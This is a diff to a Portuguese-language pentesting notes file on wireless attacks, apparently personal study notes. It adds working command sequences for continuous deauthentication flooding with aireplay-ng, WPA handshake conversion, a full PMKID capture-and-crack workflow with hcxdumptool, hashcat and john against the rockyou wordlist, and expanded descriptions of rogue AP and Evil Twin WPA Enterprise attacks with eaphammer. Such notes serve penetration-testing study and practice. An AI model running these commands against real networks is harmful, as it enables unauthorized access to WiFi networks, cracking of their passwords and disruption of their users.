@@ -5380,13 +5380,14 @@ Após deixar a placa em modo de captura habilitado, rodar o comando abaixo para 
 Coloca em modo de captura salvando em arquivo.cap
 
 	aireplay-ng -0 10 -a MAC-ROUTER -c MAC-CLIENT  wlan-interf 
+	aireplay-ng -0 0 -a MAC-ROUTER wlan0mon
 
 Manda 10 pacotes de  desautenticação. 
 
 Quando aparecer o handshake no canto superior da tela, parar a captura e pagar o arquivo que foi salvo a captura.
 
     aircrack-ng captura.wpa.cap -w /caminho/wordlist 
-
+	cap2hccapx.bin air_1.cap air_1.hccapx
 Faz um bruteforce da senha wpa capturada.
 
     airdecap-ng -p s3nh4d0w1f1 captura.cap -e ssid-em-texto 
@@ -5427,9 +5428,20 @@ Attack de SSID oculto bruteforce para encontrar o SSID - Ele não vai aparecer n
 
 Aparentemente comando para enviar DEAUTH para capturar o WEP password
 
+- WPA-PMKID
+
+Ataque utilizado para captura da chave enviada enquanto acontece a desconexão de um AP para outro em um ambiente corporativo geralmente
+
+	cd /otp/tools/hcxtools
+	hcxdumptool -i wlan0 -w pmkid.pcap
+	hcxpcapngtool -o hash.hc22000 -E essidlist pmkid.pcap
+	hashcat -m 22000 hash.hc22000 -a 0 rockyou.txt
+	hcxhashtool -i hash.hc22000 --john=hash_john
+	john hash --wordlist=rockyou.txt
+
 - ROGUE AP
 
-Técnica para criar um sinal wifi igual ao target e capturar a chave PSK
+Técnica para criar um sinal wifi igual ao sinal que outros dispositivos ficam buscando o target e capturar a chave PSK
 Pode ser usado para descobrir chaves e quebrar para descobrir a senha
 
 Passo1 Criar um arquivo propagar o sinal clonado com a ferramenta `hostapd-mana`
@@ -5456,7 +5468,7 @@ Passo2 Converta a chave para ficar usável pelo jhon
 
 - Evil Twin WPA Enterprise
 
-Ataque de Evil Twin
+Ataque de Evil Twin, é um ataque em que existe uma grande gama de AP, e para identificar os targets, deve-se encontrar o canal padrão de comunicação, que geralmente é o mesmo para todos os APs
 
 	cd tools/eaphammer
 	sudo python3 ./eaphammer --cert-wizard
